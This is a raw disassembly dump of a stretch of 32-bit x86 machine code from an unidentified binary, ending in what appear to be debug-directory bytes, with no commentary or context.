  433483:	xor    al,BYTE PTR [ebx]
  433485:	mov    edi,DWORD PTR [ebx]
  433487:	in     al,0x75
  433489:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43348f:	dec    ebx
  433490:	xor    esi,DWORD PTR [edx]
  433492:	lea    ecx,[edx]
  433494:	or     BYTE PTR [ebx+0x900f072],cl
  43349a:	ja     0x43346b
  43349c:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  4334a3:	cmp    ch,al
  4334a5:	jne    0x43349a
  4334a7:	mov    edi,edi
  4334a9:	fadd   QWORD PTR [ebp+0x0]
  4334ac:	mov    eax,edi
  4334ae:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4334b5:	mov    edx,DWORD PTR [ebx]
  4334b7:	in     al,0x45
  4334b9:	or     DWORD PTR [ebx],esi
  4334bb:	iret   
  4334bc:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4334c3:	xor    dl,BYTE PTR [eax-0x75]
  4334c6:	sbb    al,0xe0
  4334c8:	dec    DWORD PTR [ecx]
  4334ca:	mov    ecx,edi
  4334cc:	in     al,dx
  4334cd:	mov    eax,es
  4334cf:	dec    ebx
  4334d0:	mov    DWORD PTR [edx],esi
  4334d2:	fmul   QWORD PTR [edx]
  4334d4:	jne    0x433461
  4334d6:	(bad)  
  4334d7:	(bad)  
  4334d9:	or     DWORD PTR [ebp-0x31],eax
  4334dc:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4334e3:	cmp    bh,bh
  4334e5:	jne    0x43352c
  4334e7:	lea    ecx,[ebx-0x38372750]
  4334ed:	inc    ebx
  4334ef:	mov    eax,ecx
  4334f1:	mov    eax,0xa00c111
  4334f6:	jne    0x43353d
  4334f8:	mov    esi,DWORD PTR [ebx]
  4334fa:	test   al,0x3
  4334fc:	inc    ebp
  4334fd:	mov    DWORD PTR [eax-0xc],edx
  433500:	loop   0x433547
  433502:	push   DWORD PTR [ebx]
  433504:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  43350a:	add    DWORD PTR [eax],eax
  43350c:	mov    eax,edi
  43350e:	lods   al,BYTE PTR ds:[esi]
  43350f:	dec    ebp
  433510:	inc    ebp
  433511:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433517:	retf   
  433518:	mov    edx,ecx
  43351a:	adc    al,0x84
  43351c:	(bad)  
  43351d:	std    
  43351e:	ret    
  43351f:	jmp    FWORD PTR [edi-0x2b7474bb]
  433525:	hlt    
  433526:	rol    edi,0x82
  433529:	ret    
  43352a:	cld    
  43352b:	enter  0x11ff,0x45
  43352f:	inc    ebp
  433530:	pop    edi
  433531:	mov    ebx,DWORD PTR [ebx+0x14]
  433534:	ret    0xc7
  433537:	test   BYTE PTR [ebx+0x4532519b],cl
  43353d:	jmp    0x4334ca
  43353f:	push   0x8
  433541:	call   DWORD PTR [esi]
  433543:	in     al,dx
  433544:	add    BYTE PTR [ebp+0x1],0x50
  433548:	add    bh,ah
  43354a:	add    bh,bh
  43354c:	icebp  
  43354d:	mov    ecx,DWORD PTR [eax]
  43354f:	cld    
  433550:	pop    es
  433551:	dec    ebp
  433552:	shl    DWORD PTR [ebx],0x72
  433555:	add    eax,DWORD PTR [eax]
  433557:	cmp    edx,ecx
  433559:	je     0x43356b
  43355b:	mov    esi,DWORD PTR [ebp-0x4]
  43355e:	inc    edi
  433560:	or     al,0xc3
  433562:	jmp    FWORD PTR [edx-0x18]
  433565:	(bad)  
  433566:	sti    
  433567:	cwde   
  433568:	(bad)  
  433569:	call   0xffa12e74
  43356e:	or     al,0x45
  433570:	push   ebp
  433571:	sub    esp,0x18
  433574:	push   ebx
  433575:	inc    ebp
  433576:	mov    edi,edi
  433578:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43357f:	test   al,0x54
  433581:	inc    ebp
  433582:	push   ecx
  433583:	push   eax
  433584:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  43358a:	add    ah,bh
  43358c:	(bad)  
  43358d:	dec    ebp
  43358e:	add    DWORD PTR [ebx],esi
  433590:	inc    ebp
  433591:	add    ecx,DWORD PTR [ebx+0x74943b]
  433597:	push   0xffffff8b
  433599:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43359f:	add    eax,DWORD PTR [ecx]
  4335a1:	or     BYTE PTR [eax],al
  4335a3:	call   0xff852da8
  4335a8:	mov    eax,DWORD PTR [ebp+0x14]
  4335ab:	mov    ecx,DWORD PTR [ecx+0x801ac]
  4335b1:	inc    ebp
  4335b2:	dec    ecx
  4335b3:	add    ebp,DWORD PTR [edx+0x14]
  4335b6:	push   0x8b3045
  4335bb:	call   0x33ad8330
  4335c0:	inc    DWORD PTR [ebx]
  4335c2:	mov    DWORD PTR [edi],ecx
  4335c4:	mov    eax,ecx
  4335c6:	or     BYTE PTR [ebp-0x3d],cl
  4335c9:	cmp    eax,edi
  4335cb:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4335d0:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4335d6:	adc    al,0xc9
  4335d8:	inc    ebp
  4335d9:	adc    BYTE PTR [eax+0x55],dl
  4335dc:	jne    0x4335ca
  4335de:	call   0xff54356e
  4335e3:	dec    ebp
  4335e4:	inc    ebp
  4335e5:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4335eb:	add    BYTE PTR [ebx],bh
  4335ed:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4335f1:	push   esp
  4335f2:	or     al,0x51
  4335f4:	dec    ebp
  4335f5:	xor    DWORD PTR [ebx],0xf32039b
  4335fb:	cmp    eax,DWORD PTR [ebp+0x74]
  4335fe:	mov    edi,edi
  433600:	pop    edi
  433601:	adc    BYTE PTR [ebx+0x75],bl
  433604:	ret    0x50
  433607:	mov    edx,DWORD PTR ss:[edi-0x7d]
  43360b:	(bad)  
  43360c:	clc    
  43360d:	mov    esp,ebp
  43360f:	pop    ecx
  433610:	mov    ecx,0xf80085c2
  433615:	mov    ecx,DWORD PTR [ecx+edx*2]
  433618:	push   esi
  433619:	push   esi
  43361a:	(bad)  
  43361b:	lock add DWORD PTR [ebp+0x44],eax
  43361f:	mov    edx,DWORD PTR [eax]
  433621:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433625:	or     BYTE PTR [edi+eax*1+0x51],dl
  433629:	ret    
  43362a:	xor    ebx,DWORD PTR [ebx+0x37232be]
  433630:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433636:	or     al,0x80
  433638:	jge    0x43363b
  43363a:	mov    DWORD PTR [eax],eax
  43363c:	and    al,0x8
  43363e:	cmp    DWORD PTR [ebp+0x10],eax
  433641:	mov    edx,DWORD PTR [esi]
  433643:	xchg   esp,eax
  433644:	dec    esp
  433645:	add    BYTE PTR [eax],dl
  433647:	mov    ecx,edx
  433649:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43364d:	dec    ebp
  43364e:	into   
  43364f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433655:	mov    edx,DWORD PTR [eax+0x14]
  433658:	das    
  433659:	add    al,0x45
  43365b:	add    BYTE PTR [ebp+0x0],dh
  43365e:	mov    edi,edi
  433660:	and    al,0x50
  433662:	mov    eax,DWORD PTR [eax]
  433664:	and    al,0xd1
  433666:	xor    eax,DWORD PTR [esi]
  433668:	lea    eax,[ebp+0x8]
  43366b:	xor    esi,DWORD PTR [edx+0x3]
  43366e:	add    BYTE PTR [ecx+0x4510fc44],cl
  433674:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  43367a:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433684:	cmp    al,0xff
  433686:	pushf  
  433687:	mov    edi,edi
  433689:	or     BYTE PTR [esi+ecx*1],cl
  43368c:	jne    0x433651
  43368e:	call   0xc365a
  433693:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433697:	mov    ebx,DWORD PTR [eax]
  433699:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  43369d:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  4336a5:	pop    esi
  4336a6:	and    al,0xc9
  4336a8:	call   DWORD PTR [eax]
  4336aa:	and    al,0x55
  4336ac:	call   0x28359d
  4336b1:	add    DWORD PTR [eax+edx*1+0xc],0x31
  4336b6:	clc    
  4336b7:	pushf  
  4336b8:	dec    DWORD PTR [ecx+0x57892474]
  4336be:	jmp    0x433701
  4336c0:	and    al,0x89
  4336c2:	and    al,0x24
  4336c4:	or     BYTE PTR [ebx-0x45ebdbe8],cl
  4336ca:	dec    DWORD PTR [eax]
  4336cc:	and    al,0x7
  4336ce:	pop    esi
  4336cf:	cli    
  4336d0:	in     eax,0x9b
  4336d2:	ret    0x32
  4336d5:	add    eax,edx
  4336d7:	mov    DWORD PTR [ebx+0x688b8924],ebx
  4336dd:	or     al,0xf8
  4336df:	jl     0x43375e
  4336e1:	adc    al,0x9c
  4336e3:	dec    ebp
  4336e4:	push   0xff8b7575
  4336e9:	and    al,0xff
  4336eb:	xor    edi,edi
  4336ed:	mov    esi,DWORD PTR [esp-0x75]
  4336f1:	add    ecx,DWORD PTR [ebx+0x4cca0c0f]
  4336f7:	or     bl,ch
  4336f9:	cmp    DWORD PTR [eax],edx
  4336fb:	sbb    al,0x44
  4336fd:	or     BYTE PTR [eax+edx*1-0x7c],cl
  433701:	xor    ah,BYTE PTR [eax*4-0x7a8accf2]
  433708:	or     BYTE PTR [ecx*4+0x5d5fbf74],ah
  43370f:	test   eax,0x83001010
  433714:	dec    eax
  433715:	adc    BYTE PTR [eax],al
  433717:	adc    edi,DWORD PTR [edx+0x10]
  43371a:	add    cl,bh
  43371c:	jae    0x43372e
  43371e:	add    BYTE PTR [ebx-0x4bffefb4],dh
  433724:	pop    eax
  433725:	adc    BYTE PTR [eax],al
  433727:	fidiv  DWORD PTR [ebp+0x10]
  43372a:	add    dh,bl
  43372c:	movups xmm0,XMMWORD PTR [eax]
  43372f:	popf   
  433730:	push   cs
  433731:	adc    BYTE PTR [eax],al
  433733:	ins    DWORD PTR es:[edi],dx
  433734:	or     BYTE PTR [eax],dl
  433736:	add    BYTE PTR [ebx+eiz*2+0x370f0010],cl
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [ebx],dl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [edi],dl
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [ebx],bl
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [edi],bl
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [ebx],ah
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [edi],ah
  433754:	aaa    
  433755:	inc    ebx
  433756:	add    BYTE PTR [ebx],ch
  433758:	aaa    
  433759:	inc    ebx
  43375a:	add    BYTE PTR [edi],ch
  43375c:	aaa    
  43375d:	inc    ebx
  43375e:	add    BYTE PTR [ebx],dh
  433760:	aaa    
  433761:	inc    ebx
  433762:	add    BYTE PTR [edi],dh
  433764:	aaa    
  433765:	inc    ebx
  433766:	add    BYTE PTR [ebx-0x73ffefdd],bh
  43376c:	cmp    al,0x10
  43376e:	add    BYTE PTR [ebx+0x30],cl
  433771:	adc    BYTE PTR [eax],al
  433773:	sub    al,0xc
  433775:	adc    BYTE PTR [eax],al
  433777:	push   ds
  433778:	adc    BYTE PTR ds:[eax],al
  43377b:	mov    bh,0x56
  43377d:	adc    BYTE PTR [eax],al
  43377f:	adc    eax,DWORD PTR [eax+edx*1+0x0]
  433783:	cmp    al,0x4f
  433785:	adc    BYTE PTR [eax],al
  433787:	addr16 aaa 
  433789:	inc    ebx
  43378a:	add    BYTE PTR [ebx+0x37],ch
  43378d:	inc    ebx
  43378e:	add    BYTE PTR [edi+0x37],ch
  433791:	inc    ebx
  433792:	add    BYTE PTR [ebx+0x37],dh
  433795:	inc    ebx
  433796:	add    BYTE PTR [edi+0x37],dh
  433799:	inc    ebx
  43379a:	add    BYTE PTR [ebx+0x37],bh
  43379d:	inc    ebx
  43379e:	add    BYTE PTR [edi+0x37],bh
  4337a1:	inc    ebx
  4337a2:	add    BYTE PTR [ebx-0x23ffbcc9],al
  4337a8:	pop    esp
  4337a9:	adc    BYTE PTR [eax],al
  4337ab:	jle    0x4337cd
  4337ad:	adc    BYTE PTR [eax],al
  4337af:	cld    
  4337b0:	dec    edx
  4337b1:	adc    BYTE PTR [eax],al
  4337b3:	add    al,0xb
  4337b5:	adc    BYTE PTR [eax],al
  4337b7:	push   ebx
  4337b8:	ins    DWORD PTR es:[edi],dx
  4337b9:	adc    BYTE PTR [eax],al
  4337bb:	fs jl  0x4337ce
  4337be:	add    BYTE PTR [edx+0x42001015],ah
  4337c4:	jge    0x4337d6
  4337c6:	add    BYTE PTR [edi-0x54ffbcc9],ah
  4337cc:	aaa    
  4337cd:	inc    ebx
  4337ce:	add    BYTE PTR [edi-0x4cffbcc9],ch
  4337d4:	aaa    
  4337d5:	inc    ebx
  4337d6:	add    BYTE PTR [edi-0x44ffbcc9],dh
  4337dc:	aaa    
  4337dd:	inc    ebx
  4337de:	add    BYTE PTR [edi-0x3cffbcc9],bh
  4337e4:	aaa    
  4337e5:	inc    ebx
  4337e6:	add    BYTE PTR [edi+0x2300103a],ah
  4337ec:	aas    
  4337ed:	adc    BYTE PTR [eax],al
  4337ef:	jne    0x4337fc
  4337f1:	adc    BYTE PTR [eax],al
  4337f3:	fldenv [esi]
  4337f5:	adc    BYTE PTR [eax],al
  4337f7:	xchg   esp,eax
  4337f8:	push   0x10
  4337fa:	add    bl,ah
  4337fc:	pop    eax
  4337fd:	adc    BYTE PTR [eax],al
  4337ff:	in     al,0x2f
  433801:	adc    BYTE PTR [eax],al
  433803:	leave  
  433804:	sbb    DWORD PTR [eax],edx
  433806:	add    bh,ah
  433808:	aaa    
  433809:	inc    ebx
  43380a:	add    bl,ch
  43380c:	aaa    
  43380d:	inc    ebx
  43380e:	add    bh,ch
  433810:	aaa    
  433811:	inc    ebx
  433812:	add    bl,dh
  433814:	aaa    
  433815:	inc    ebx
  433816:	add    bh,dh
  433818:	aaa    
  433819:	inc    ebx
  43381a:	add    bl,bh
  43381c:	aaa    
  43381d:	inc    ebx
  43381e:	add    bh,bh
  433820:	aaa    
  433821:	inc    ebx
  433822:	add    BYTE PTR [ebx],al
  433824:	cmp    BYTE PTR [ebx+0x0],al
  433827:	mov    ebp,0x1d001062
  43382c:	adc    BYTE PTR [eax],dl
  43382e:	add    BYTE PTR [edi+0x51],dl
  433831:	adc    BYTE PTR [eax],al
  433833:	dec    eax
  433834:	ins    DWORD PTR es:[edi],dx
  433835:	adc    BYTE PTR [eax],al
  433837:	mov    eax,DWORD PTR [edi]
  433839:	adc    BYTE PTR [eax],al
  43383b:	mov    ah,0x7
  43383d:	adc    BYTE PTR [eax],al
  43383f:	ror    DWORD PTR [esi],1
  433841:	adc    BYTE PTR [eax],al
  433843:	pop    edi
  433844:	inc    ebp
  433845:	adc    BYTE PTR [eax],al
  433847:	daa    
  433848:	cmp    BYTE PTR [ebx+0x0],al
  43384b:	sub    edi,DWORD PTR [eax]
  43384d:	inc    ebx
  43384e:	add    BYTE PTR [edi],ch
  433850:	cmp    BYTE PTR [ebx+0x0],al
  433853:	xor    edi,DWORD PTR [eax]
  433855:	inc    ebx
  433856:	add    BYTE PTR [edi],dh
  433858:	cmp    BYTE PTR [ebx+0x0],al
  43385b:	cmp    edi,DWORD PTR [eax]
  43385d:	inc    ebx
  43385e:	add    BYTE PTR [edi],bh
  433860:	cmp    BYTE PTR [ebx+0x0],al
  433863:	inc    ebx
  433864:	cmp    BYTE PTR [ebx+0x0],al
  433867:	dec    ecx
  433868:	ss push eax
  43386a:	pop    edi
  43386b:	ss inc ebx
  43386d:	ss pop edx
  43386f:	xor    ebx,DWORD PTR [edi+0x52]
  433872:	add    BYTE PTR [edi+ecx*2+0x32],dl
  433876:	pop    edi
  433877:	dec    esi
  433878:	dec    esp
  433879:	dec    eax
  43387a:	xor    esi,DWORD PTR [edx]
  43387c:	pop    edi
  43387d:	xor    al,0x4b
  43387f:	add    BYTE PTR [eax+0x49],cl
  433882:	push   ebp
  433883:	xor    al,0x5f
  433885:	dec    esp
  433886:	inc    edx
  433887:	dec    ecx
  433888:	cmp    DWORD PTR [edi+ebx*2],esi
  43388b:	pop    ecx
  43388c:	inc    edi
  43388d:	add    BYTE PTR [eax+0x50],bl
  433890:	dec    eax
  433891:	pop    edi
  433892:	push   ebp
  433893:	push   ecx
  433894:	inc    edi
  433895:	xor    cl,BYTE PTR [edx+0x38]
  433898:	push   esi
  433899:	add    BYTE PTR [ebx+0x4a],al
  43389c:	push   edx
  43389d:	pop    edi
  43389e:	dec    edi
  43389f:	dec    eax
  4338a0:	dec    edi
  4338a1:	dec    edi
  4338a2:	dec    edx
  4338a3:	add    BYTE PTR [ecx+0x52],al
  4338a6:	cmp    DWORD PTR [edi+0x56],ebx
  4338a9:	aaa    
  4338aa:	dec    esp
  4338ab:	cmp    DWORD PTR [ebx+0x5f],eax
  4338ae:	push   edx
  4338af:	inc    esp
  4338b0:	add    BYTE PTR [ecx+0x37],bl
  4338b3:	inc    esp
  4338b4:	pop    edi
  4338b5:	dec    ecx
  4338b6:	xor    esi,DWORD PTR [edi]
  4338b8:	xor    DWORD PTR [edi+0x49],ebx
  4338bb:	push   esp
  4338bc:	xor    eax,DWORD PTR [eax]
  4338be:	push   edx
  4338bf:	xor    BYTE PTR [eax+0x5f],bl
  4338c2:	dec    eax
  4338c3:	push   edi
  4338c4:	inc    esi
  4338c5:	xor    DWORD PTR [edi+0x5f],edx
  4338c8:	cmp    BYTE PTR [ebx+0x37],dl
  4338cb:	add    BYTE PTR [esi+0x42],dl
  4338ce:	dec    ecx
  4338cf:	xor    ebx,DWORD PTR [edi+0x45]
  4338d2:	xor    BYTE PTR [ebp+0x5f],cl
  4338d5:	xor    al,0x34
  4338d7:	xor    BYTE PTR [edx+0x5f],cl
  4338da:	inc    edi
  4338db:	add    BYTE PTR [edx+0x57],dl
  4338de:	xor    ebx,DWORD PTR [edi+0x31]
  4338e1:	dec    edx
  4338e2:	push   edi
  4338e3:	xor    eax,0x4d435f
  4338e8:	dec    ecx
  4338e9:	xor    eax,0x36365f39
  4338ee:	dec    eax
  4338ef:	xor    BYTE PTR [eax],al
  4338f1:	dec    edi
  4338f2:	inc    ebx
  4338f3:	push   edi
  4338f4:	pop    edi
  4338f5:	inc    edi
  4338f6:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  4338fb:	add    BYTE PTR [edx+0x0],al
  4338fe:	pop    eax
  4338ff:	add    BYTE PTR [edi+0x0],al
  433902:	add    BYTE PTR ss:[edi+0x0],bl
  433906:	push   esi
  433907:	add    BYTE PTR [ebx+0x0],al
  43390a:	dec    esi
  43390b:	add    BYTE PTR [eax+eax*1+0x0],al
  43390f:	add    BYTE PTR [edi+0x0],cl
  433912:	dec    ebp
  433913:	add    BYTE PTR [edi+0x0],al
  433916:	xor    eax,DWORD PTR [eax]
  433918:	pop    edi
  433919:	add    BYTE PTR [eax+eax*1],dh
  43391c:	dec    esi
  43391d:	add    BYTE PTR [edx+0x0],bl
  433920:	cmp    BYTE PTR [eax],al
  433922:	pop    edi
  433923:	add    BYTE PTR [eax+0x0],bl
  433926:	cmp    BYTE PTR [eax],al
  433928:	add    BYTE PTR [eax],al
  43392a:	push   edx
  43392b:	add    BYTE PTR [eax+0x0],bl
  43392e:	push   ecx
  43392f:	add    BYTE PTR [edi+0x0],bl
  433932:	dec    esp
  433933:	add    BYTE PTR [edx+0x0],dl
  433936:	dec    ecx
  433937:	add    BYTE PTR [edi+0x0],cl
  43393a:	inc    esp
  43393b:	add    BYTE PTR [edi+0x0],bl
  43393e:	dec    edi
  43393f:	add    BYTE PTR [ebx],dh
  433941:	add    BYTE PTR [eax+eax*1+0x0],al
  433945:	add    BYTE PTR [ebx+0x0],al
  433948:	push   eax
  433949:	add    BYTE PTR [ebp+0x0],al
  43394c:	pop    edi
  43394d:	add    BYTE PTR ds:0x39004500,dh
  433953:	add    BYTE PTR [edi+0x0],bl
  433956:	push   esi
  433957:	add    BYTE PTR [eax],al
  433959:	add    BYTE PTR [edi+0x0],al
  43395c:	dec    esi
  43395d:	add    BYTE PTR [esi+0x0],dl
  433960:	pop    edi
  433961:	add    BYTE PTR [edi+0x0],al
  433964:	push   esp
  433965:	add    BYTE PTR [eax+0x0],cl
  433968:	xor    al,BYTE PTR [eax]
  43396a:	xor    DWORD PTR [eax],eax
  43396c:	pop    edi
  43396d:	add    BYTE PTR [edi+0x0],cl
  433970:	add    BYTE PTR ss:[ebx],dh
  433973:	add    BYTE PTR [eax],al
  433975:	add    BYTE PTR [eax+eax*1+0x45],al
  433979:	add    BYTE PTR [ecx+0x0],cl
  43397c:	pop    edi
  43397d:	add    BYTE PTR [edx+0x0],dl
  433980:	dec    eax
  433981:	add    BYTE PTR [eax+eax*1],dh
  433984:	dec    eax
  433985:	add    BYTE PTR [eax],al
  433987:	add    BYTE PTR [eax],al
  433989:	push   edx
  43398a:	push   ebx
  43398b:	inc    esp
  43398c:	push   ebx
  43398d:	cli    
  43398e:	mov    bh,0x7c
  433990:	popf   
  433991:	push   cs
  433992:	xlat   BYTE PTR ds:[ebx]
  433993:	stos   DWORD PTR es:[edi],eax
  433994:	dec    ebp
  433995:	mov    DWORD PTR [ebx],ebp
  433997:	pop    ecx
  433998:	fs test eax,0xeb4083f
  43399e:	add    BYTE PTR [eax],al
  4339a0:	add    BYTE PTR [ecx+0x3a],dl
  4339a3:	pop    esp
  4339a4:	js     0x4339fe
  4339a6:	ins    DWORD PTR es:[edi],dx
  4339a7:	arpl   WORD PTR [esi+0x76],sp
  4339aa:	addr16 jp 0x433a21
  4339ad:	pop    esp
  4339ae:	inc    ebp
  4339af:	inc    esi
  4339b0:	dec    edx
  4339b1:	bound  ebp,QWORD PTR [edx+0x67]
  4339b4:	popa   
  4339b5:	push   0x6c776a5c
  4339ba:	bound  esp,QWORD PTR [eax+ebp*2+0x70]
  4339be:	popa   
  4339bf:	bound  esi,QWORD PTR [edi+0x65]
  4339c2:	cs jo  0x433a29
  4339c5:	bound  eax,QWORD PTR [eax]
	...
